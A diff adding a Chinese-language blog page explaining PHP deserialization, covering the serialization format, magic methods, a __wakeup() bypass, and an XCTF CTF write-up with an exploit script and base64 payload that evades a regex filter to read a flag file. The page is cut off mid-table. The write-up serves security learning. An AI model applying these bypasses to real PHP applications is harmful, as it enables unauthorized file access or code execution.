@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="反序列化PHP 反序列化serialize()serialize() —&gt; 函数用于序列化对象或数组，并返回一个字符串 123456789101112&lt;?phpClass test&amp;#123;  public $a&#x3D; &amp;#x27;1&amp;#x27;;  public $bb&#x3D; 2;  public $ccc&#x3D; True;&amp;#125;$r&#x3D; new test();echoserialize(">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反序列化">
+<meta property="og:url" content="https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="iah&#39;s blog">
+<meta property="og:description" content="反序列化PHP 反序列化serialize()serialize() —&gt; 函数用于序列化对象或数组，并返回一个字符串 123456789101112&lt;?phpClass test&amp;#123;  public $a&#x3D; &amp;#x27;1&amp;#x27;;  public $bb&#x3D; 2;  public $ccc&#x3D; True;&amp;#125;$r&#x3D; new test();echoserialize(">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/640">
+<meta property="article:published_time" content="2023-08-05T08:58:37.000Z">
+<meta property="article:modified_time" content="2023-08-05T09:02:55.695Z">
+<meta property="article:author" content="iahzl">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="unserialize">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/640">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>反序列化</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="iah's blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/iahzl">Projects</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/XML-XXE%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=反序列化"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=反序列化"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=反序列化"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=反序列化&body=Check out this article: https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=反序列化"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=反序列化"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=反序列化"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=反序列化"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=反序列化&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://iahzl.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=反序列化"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.</span> <span class="toc-text">PHP 反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#serialize"><span class="toc-number">1.1.1.</span> <span class="toc-text">serialize()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unserialize"><span class="toc-number">1.1.2.</span> <span class="toc-text">unserialize()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.3.</span> <span class="toc-text">常用魔法函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%BA%8F%E5%88%97%E5%8C%96%E8%A1%A5%E5%85%85"><span class="toc-number">1.1.4.</span> <span class="toc-text">php序列化补充</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E4%B8%8E%E6%9E%90%E6%9E%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.5.</span> <span class="toc-text">构造函数与析构函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%86%E8%8A%82"><span class="toc-number">1.1.6.</span> <span class="toc-text">序列化细节</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%AB%E4%B9%89"><span class="toc-number">1.1.6.1.</span> <span class="toc-text">序列化含义</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#public%E3%80%81protected%E3%80%81private%E4%B8%8B%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.1.6.2.</span> <span class="toc-text">public、protected、private下序列化对象的区别</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.</span> <span class="toc-text">JAVA反序列化</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        反序列化
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">iahzl</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-08-05T08:58:37.000Z" class="dt-published" itemprop="datePublished">2023-08-05</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Web/">Web</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Java/" rel="tag">Java</a>, <a class="p-category" href="/tags/PHP/" rel="tag">PHP</a>, <a class="p-category" href="/tags/unserialize/" rel="tag">unserialize</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="PHP-反序列化"><a href="#PHP-反序列化" class="headerlink" title="PHP 反序列化"></a>PHP 反序列化</h2><h3 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h3><p>serialize() —&gt; 函数用于序列化对象或数组，并返回一个字符串</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class test&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$a</span>= <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$bb</span>= <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$ccc</span>= True;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span>= <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="title function_ invoke__">echoserialize</span>(<span class="variable">$r</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$array_t</span>= <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="string">&quot;1&quot;</span>,<span class="string">&quot;bb&quot;</span>=&gt;<span class="string">&quot;2&quot;</span>,<span class="string">&quot;ccc&quot;</span>=&gt;<span class="string">&quot;3&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$array_t</span>);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>O:4:”test”:3:{s:1:”a”;s:1:”1”;s:2:”bb”;i:2;s:3:”ccc”;b:1;}<br>a:3:</p>
+</blockquote>
+<p>各个字符的意义 —&gt; <code>第一个字母O 代表 Object，a代表 array，s代表 string，,i表示数字</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/640" alt="img"><br><strong>类的属性有三种 private protected 和 public</strong></p>
+<p>PHP 序列化的时候 <strong>private</strong>和 <strong>protected</strong> 变量会引入不可见字符<code>%00</code>，<code>%00类名%00属性名</code> 为private，<code>%00*%00属性名</code> 为protected，注意这两个 <strong>%00</strong>就是 ascii 码为0 的字符。这个字符显示和输出可能看不到，甚至导致截断，但是url编码后就可以看得清楚</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class test&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$a</span>= <span class="string">&quot;a&quot;</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$b</span>= <span class="string">&quot;b&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$c</span>= <span class="string">&quot;c&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span>= <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$r</span>));</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>O:4:”test”:3:{s:7:”testa”;s:1:”a”;s:4:”*b”;s:1:”b”;s:1:”c”;s:1:”c”;}</p>
+<p>O%3A4%3A%22test%22%3A3%3A%7Bs%3A7%3A%22%00test%00a%22%3Bs%3A1%3A%22a%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bs%3A1%3A%22b%22%3Bs%3A1%3A%22c%22%3Bs%3A1%3A%22c%22%3B%7D</p>
+</blockquote>
+<h3 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h3><p>unserialize() —&gt; 函数用于将通过 serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sites</span> = <span class="keyword">array</span>(<span class="string">&#x27;t1&#x27;</span>, <span class="string">&#x27;tt2&#x27;</span>, <span class="string">&#x27;ttt3&#x27;</span>);</span><br><span class="line"><span class="variable">$serialized_data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$sites</span>);</span><br><span class="line"><span class="comment">#echo  $serialized_data;</span></span><br><span class="line"><span class="variable">$unserialized_data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialized_data</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$unserialized_data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Array<br>(<br>​ [0] &#x3D;&gt; t1<br>​ [1] &#x3D;&gt; tt2<br>​ [2] &#x3D;&gt; ttt3<br>)</p>
+</blockquote>
+<h3 id="常用魔法函数"><a href="#常用魔法函数" class="headerlink" title="常用魔法函数"></a>常用魔法函数</h3><table>
+<thead>
+<tr>
+<th align="left">常用魔法函数</th>
+<th align="center">定义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">__construct()</td>
+<td align="center">在创建对象时候初始化对象，一般用于对变量赋初值。创建一个新的类时，自动调用该方法</td>
+</tr>
+<tr>
+<td align="left">__destruct()</td>
+<td align="center">和构造函数相反，当对象所在函数调用完毕后执行.即当一个类被销毁时自动调用该方法</td>
+</tr>
+<tr>
+<td align="left">__toString()</td>
+<td align="center">当对象被当做一个字符串使用时调用。</td>
+</tr>
+<tr>
+<td align="left">__sleep()</td>
+<td align="center">当调用<code>serialize()</code>函数时，PHP 将试图在序列动作之前调用该对象的成员函数 __sleep()。这就允许对象在被序列化之前做任何清除操作</td>
+</tr>
+<tr>
+<td align="left">__wakeup()</td>
+<td align="center">反序列化恢复对象之前调用该方法.当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数</td>
+</tr>
+<tr>
+<td align="left">__invoke()</td>
+<td align="center">把一个实例对象当作函数使用时自动调用</td>
+</tr>
+<tr>
+<td align="left">__call()</td>
+<td align="center">当调用对象中不存在的方法会自动调用该方法。</td>
+</tr>
+<tr>
+<td align="left">__get()</td>
+<td align="center">在调用私有属性的时候会自动执行</td>
+</tr>
+<tr>
+<td align="left">__isset()</td>
+<td align="center">在不可访问的属性上调用isset()或empty()触发</td>
+</tr>
+<tr>
+<td align="left">__unset()</td>
+<td align="center">在不可访问的属性上使用unset()时触发</td>
+</tr>
+</tbody></table>
+<p><strong>__wakeup() bypass</strong></p>
+<p>在需要对__wakeup() 进行绕过的时候，可以让序列化结果中类属性的数值大于其真正的数值进行绕过，这个方式适用于PHP &lt; 5.6.25 和 PHP&lt; 7.0.10</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class User&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;Bob&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;nameis Bob &lt;/br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;exit&lt;/br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&quot;u&quot;</span>]));</span><br></pre></td></tr></table></figure>
+
+<p>POST 参数O:4:”User”:1:{s:4:”name”;s:3:”Bob”;}可以看到输出是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">object</span>(User)[<span class="number">1</span>]</span><br><span class="line"> <span class="keyword">public</span> <span class="string">&#x27;name&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;Bob&#x27;</span> (length=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">nameis Bob</span><br></pre></td></tr></table></figure>
+
+<p>如果在某些情况下，不想让__wakeup() 执行，可以将 “User”后的 2 改为一个比2 大的数字</p>
+<p>POST 参数O:4:”User”:2:{s:4:”name”;s:3:”Bob”;}：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nameis <span class="keyword">Bob</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">booleanfalse</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>[XCTF]Web – Web_php_unserialize</strong></p>
+<p>题目源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;   <span class="comment">#构造函数，对类的变量进行初始化</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;  <span class="comment">#魔术方法，如果有反序列化的使用，在反序列化之前会先调用这个方法</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123;         <span class="comment">#存在$var                   </span></span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]);   <span class="comment">#将$var base64解码并赋值$var</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>思路：主要是正则绕过和_wakeup（）绕过</p>
+<p>正则匹配：因为不能匹配<code>O:4</code>这种，我们可以<code>O:+4</code>绕过，因为在url编码中<code>+</code>会被转换为空格</p>
+<p>__wakeup()绕过：让序列化结果中类属性的数值大于其真正的数值进行绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> demo;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);  <span class="comment">//echo  O:4:&quot;Demo&quot;:1:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span></span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$b</span>);<span class="comment">//绕过preg_match</span></span><br><span class="line"><span class="variable">$b</span>= <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$b</span>);<span class="comment">//绕过wakeup</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$b</span>);     </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<blockquote>
+<p>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ&#x3D;&#x3D;</p>
+</blockquote>
+<p>再进行get传参即可</p>
+<h3 id="php序列化补充"><a href="#php序列化补充" class="headerlink" title="php序列化补充"></a>php序列化补充</h3><p>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码<br>执行，SQL 注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行<br>反序列化的时候就有可能会触发对象中的一些魔术方法。</p>
+<p><strong>serialize() &#x2F;&#x2F;将一个对象转换成一个字符串</strong><br><strong>unserialize() &#x2F;&#x2F;将字符串还原成一个对象</strong></p>
+<p>触发：<code>unserialize </code>函数的变量可控，文件中存在可利用的类，类中有魔术方法：</p>
+<blockquote>
+<p>所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__call() 			//在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() 			//用于从不可访问的属性读取数据</span><br><span class="line">__set() 			//用于将数据写入不可访问的属性</span><br><span class="line">__isset() 		//在不可访问的属性上调用 isset()或 empty()触发</span><br><span class="line">__unset() 		//在不可访问的属性上使用 <span class="built_in">unset</span>()时触发</span><br><span class="line">__invoke() 		//当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>
+
+<h3 id="构造函数与析构函数"><a href="#构造函数与析构函数" class="headerlink" title="构造函数与析构函数"></a>构造函数与析构函数</h3><ul>
+<li>__construct()<br>具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。</li>
+<li>__destruct()<br>析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</li>
+</ul>
+<p><code>new</code>出一个新的对象时就会调用__construct(),而对象被销毁时，例如程序退出时，就会调用__destruct()</p>
+<h3 id="序列化细节"><a href="#序列化细节" class="headerlink" title="序列化细节"></a>序列化细节</h3><h4 id="序列化含义"><a href="#序列化含义" class="headerlink" title="序列化含义"></a>序列化含义</h4><p>例如：<code>O:4:&quot;user&quot;:2:&#123;s:3:&quot;age&quot;;i:18;s:4:&quot;name&quot;;s:3:&quot;LEO&quot;;&#125;</code><br> O代表对象；4代表对象名长度；2代表2个成员变量；其余参照如下</p>
+<table>
+<thead>
+<tr>
+<th align="center">类型</th>
+<th align="center">结构</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">String</td>
+<td align="center">s:size:value;</td>
+</tr>
+<tr>
+<td align="center">Integer</td>
+<td align="center">i:value;</td>
+</tr>
+<tr>
+<td align="center">Boolean</td>
+<td align="center">b:value;(保存1或0)</td>
+</tr>
+<tr>
+<td align="center">Null</td>
+<td align="center">N;</td>
+</tr>
+<tr>
+<td align="center">Array</td>
+<td align="center">a:size:</td>
+</tr>
+<tr>
